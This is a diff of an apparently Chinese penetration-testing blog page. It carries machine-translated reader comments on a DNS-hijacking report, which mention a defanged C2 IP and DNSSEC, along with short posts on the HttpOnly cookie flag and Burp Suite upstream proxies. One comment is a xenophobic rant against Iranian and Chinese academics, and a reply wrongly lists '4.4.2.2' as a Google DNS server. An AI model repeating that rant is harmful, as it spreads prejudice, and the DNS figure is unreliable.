+<a href="http://www.virustotal.com/en/url/55263f4edcd02ab7e9c391f1a36c4e84ff9868133a40020e9db2046fba42a11f/analysis">http://www.virustotal.com/en/url/55263f4edcd02ab7e9c391f1a36c4e84ff9868133a40020e9db2046fba42a11f/analysis</a></p>
+
+<p>答复<br/>
+橡子<br/>
+2019年2月18日下午1:24<br/>
+Talos：“攻击者将主机名重定向到IP 185.20.187 [。] 8短时间。”11月6日，9月13日等</p>
+
+<p>C2（命令和控制）服务器，以及另外两个IP（全部在同一荷兰网络上）。</p>
+
+<p>答复<br/>
+ChrisSuperPogi<br/>
+2019年2月18日下午2:03<br/>
+令我惊讶的是，我们可能无法实践多年前推荐的数据卫生！我的意思是，DNSSEC已经很老了。注册表锁定也已有一段时间了。<br/>
+多因素身份验证是一个非常新的趋势，但它是网络杀戮链的关键部分。</p>
+
+<p>希望我们从中吸取教训。</p>
+
+<p>答复<br/>
+JJ<br/>
+2019年2月18日下午2:55<br/>
+注册表锁实际上并不是众所周知的，人们将它与传输锁混淆。再加上它需要花钱而且你有答案。</p>
+
+<p>答复<br/>
+YYZ<br/>
+2019年2月18日下午3:12<br/>
+IP地址的最后一个八位字节点周围的括号[]是什么意思？</p>
+
+<p>答复<br/>
+大卫C.<br/>
+2019年2月18日下午4:29<br/>
+它们旨在防止Web爬虫爬进那些（犯罪）服务器。并且防止移动网络浏览器将它们变成链接，最终可能会欺骗无辜的读者访问这些网站。</p>
+
+<p>答复<br/>
+ASB<br/>
+2019年2月18日下午4:32<br/>
+[。]旨在确保链接不会变为可点击。因此它是本网站读者的保护机制（除其他外）</p>
+
+<p>答复<br/>
+Nobby Nobbs<br/>
+2019年2月18日下午5:24<br/>
+可能是为了防止IP地址在大多数浏览器中显示为链接。在讨论像Brian这样的恶意网站时可能会出现问题。</p>
+
+<p>感谢另一篇伟大的文章，布莱恩！</p>
+
+<p>答复<br/>
+BrianKrebs<br/>
+2019年2月18日晚上10:18<br/>
+谢谢。是的，正如其他人所说，括号有效地阻止了任何网站，浏览器或电子邮件客户端将这些地址变成可点击的链接。</p>
+
+<p>答复<br/>
+大卫C.<br/>
+2019年2月18日下午4:28<br/>
+我将添加到实践列表中以获取包含身份证明的证书，而不仅仅是域。</p>
+
+<p>面对DNS劫持，证明“这是example.com”的证书毫无意义。</p>
+
+<p>一个说“示例公司，1234假街，圣克拉拉，加利福尼亚州”并且来自需要身份证明文件的权威机构将更加安全。特别是如果用户习惯于在位置栏中看到全名，并且在某些时候突然变为“example.com”。</p>
+
+<p>答复<br/>
+伊恩<br/>
+2019年2月18日晚上8:39<br/>
+没有最终用户如何保护自己的指标。在看了DNS问题很长一段时间后，我刚刚做了一次重拍。曾经有一次我没有使用我的DNS旋转器脚本 - 我有一个脚本可以随机选择随机dns服务器。野蛮但似乎可以防止明显的dns渎职行为。有点厌倦了所有这一切，互联网是故意保持borken恕我直言。伊朗应该实施制裁，例如将所有伊朗学生/教授从大学中移除，直到他们学会成为好公民。与中国人一样... LOL看看任何“敏感”的工作场所以及振动器和推动者的名字，所有人都经过了完美的审查......国家赞助的所有最敏感的地方的傀儡和间谍，而同等或更好能力的国内学生必须如果他们能找到一个地方，就要与债务和贷款斗争！最高阶的愚蠢！</p>
+
+<p>答复<br/>
+BrianKrebs<br/>
+2019年2月18日晚上9:35<br/>
+对最终用户来说有点复杂。您可以将DNS设置设置为Google的DNS - 8.8.8.8和4.4.2.2 - 当域名签名时，应该强制执行DNNSEC。但是，如果您不在自己的网络上，并且您的移动数据提供商的DNS设置启动，事情会变得更加棘手。我不确定最终用户是否有办法控制在这种情况下使用的DNS设置。</p>
+
+<p>答复<br/>
+Rich Altmaier<br/>
+2019年2月18日晚上11:09<br/>
+保护DNS当然很重要而且很好。然而，就用户保护自己而言，这基本上是一个问题：我是否连接到我建立帐户的服务器？<br/>
+我们可以使用Yubikey或等效服务器来验证用户身份。<em>但我们需要</em>一个反向Yubikey，我的密钥也确认服务器是我建立我的帐户的那个。</p>
+
+<p>我相信Yubikey的技术适用于此。但用户体验是擅离!! 我想插入我的密钥并要求密钥+浏览器确认：基于加密交换，我正在与之通信的服务器确实拥有我之前在那里建立的加密密钥。</p>
+
+<p>请！！！</p>
+
+<p>答复<br/>
+Dnspionage<br/>
+2019年2月18日晚上11:29<br/>
+更多的组织应该部署DNSSEC，但大多数组织不了解它的工作原理以及它的价值。</p>
 
                         
                       </div>
@@ -698,7 +661,95 @@ http://localhost/DVWA-master/login.php<br/><br/>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/13 16:21 下午</span>
+                    <span class="date">2019/2/19 14:7 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15483045490848.html">
+                
+                  <h1>HttpOnly</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>HttpOnly是 Set-Cookie HTTP响应头中包含的附加标志。生成cookie时使用httponly标志有助于降低客户端脚本访问受保护cookie的风险。</p>
+
+<p>如果HTTP响应头中包含HttpOnly标志，则无法通过客户端脚本访问cookie。因此即使存在xss跨站脚本漏洞，并且用户意外访问到恶意链接，浏览器也不会向第三方透露cookie（前提是浏览器支持HttpOnly）。</p>
+
+<p>参考链接：</p>
+
+<blockquote>
+<p><a href="https://www.owasp.org/index.php/HttpOnly">https://www.owasp.org/index.php/HttpOnly</a></p>
+</blockquote>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/1/24 12:35 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15483045491162.html">
+                
+                  <h1>burpsuite设置上游代理</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>burpsuite的使用技巧之一，设置上游代理。比如测试境外网站时可能需要[fanqiang]才能访问，此时这个技巧就能用得上了。</p>
+</blockquote>
+
+<p><figure><img src="http://images.lonelyor.org/burp%E8%AE%BE%E7%BD%AE%E4%B8%8A%E6%B8%B8%E4%BB%A3%E7%90%8620180823161146.png" alt="burp设置上游代理20180823161146"/><figcaption>burp设置上游代理201808</figcaption></figure></p>
+
+<p>1、在浏览器中设置burp代理以保证可以抓包<br/>
+2、开启上游代理<br/>
+3、在burp的图中所示位置设置上游代理</p>
+
+<p>打完收工</p>
+
+<h2 id="toc_0">参考链接</h2>
+
+<p><a href="http://www.360zhijia.com/360anquanke/191737.html">http://www.360zhijia.com/360anquanke/191737.html</a></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/1/24 12:35 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -799,31 +850,31 @@ http://localhost/DVWA-master/login.php<br/><br/>
 	      
 		      
 			      <li class="post">
-			        <a href="15578813198735.html">家思</a>
+			        <a href="15642124072307.html">Mutillidae 遇到的一个奇怪问题</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15577346001597.html">linux 敏感目录</a>
+			        <a href="15641083818915.html">manjaro更改国内源操作</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15573021402615.html">Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用</a>
+			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15572001451538.html">c 语言中变量前面加`*`表示什么？如`*`p</a>
+			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15554899648347.html">CEO、COO、CFO、CIO、CTO、CMO的中文是什么?</a>
+			        <a href="15611953556975.html">archlinux 安装 vmtools 遇到坑了怎么办</a>
 			      </li>
 		     
 		  
